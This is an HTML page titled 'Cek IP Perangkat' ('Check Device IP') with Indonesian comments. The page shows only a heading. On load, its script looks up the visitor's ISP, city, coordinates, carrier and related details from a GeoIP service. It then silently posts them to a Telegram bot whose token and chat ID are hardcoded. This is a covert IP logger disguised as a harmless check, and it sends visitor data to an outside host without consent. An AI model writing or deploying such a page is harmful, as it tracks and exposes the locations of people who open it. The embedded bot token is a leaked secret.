<!DOCTYPE html>
<html>
<head>
  <title>Cek IP Perangkat</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script>
    // Fungsi untuk mengirim pesan ke bot Telegram
    function sendMessageToTelegram(message) {
      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
      var chatId = '1121369247';

      // Buat URL untuk mengirim pesan menggunakan bot Telegram
      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
      var data = {
        chat_id: chatId,
        text: message
      };

      // Kirim permintaan POST ke API Telegram
      $.post(url, data, function(response) {
        console.log('Pesan berhasil dikirim ke Telegram');
      });
    }

    // Fungsi untuk mendapatkan informasi IP perangkat
    function getDeviceInfo() {
      // Ambil informasi IP perangkat dari GeoIP2 API
      $.get('https://geoip.maxmind.com/geoip/v2.1/city', function(response) {
        // Ambil nilai-nilai yang diperlukan dari respons API
        var isp = response.traits.isp;
        var country = response.country.names.en;
        var region = response.subdivisions[0].names.en;
        var city = response.city.names.en;
        var coordinates = response.location.latitude + ', ' + response.location.longitude;
        var localTime = new Date().toLocaleString();
        var domain = response.traits.domain;
        var netSpeed = response.traits.connection_type;
        var mobileCarrier = response.traits.mobile_network_operator;

        // Format pesan yang akan dikirim ke bot Telegram
        var message = `
          ISP: ${isp}
          Country: ${country}
          Region: ${region}
          City: ${city}
          Coordinates of City: ${coordinates}
          Local Time: ${localTime}
          Domain: ${domain}
          Net Speed: ${netSpeed}
          Mobile Carrier: ${mobileCarrier}
        `;

        // Kirim pesan ke bot Telegram
        sendMessageToTelegram(message);
      });
    }

    // Panggil fungsi getDeviceInfo saat halaman selesai dimuat
    $(document).ready(function() {
      getDeviceInfo();
    });
  </script>
</head>
<body>
  <h1>Cek IP Perangkat</h1>
</body>
</html>
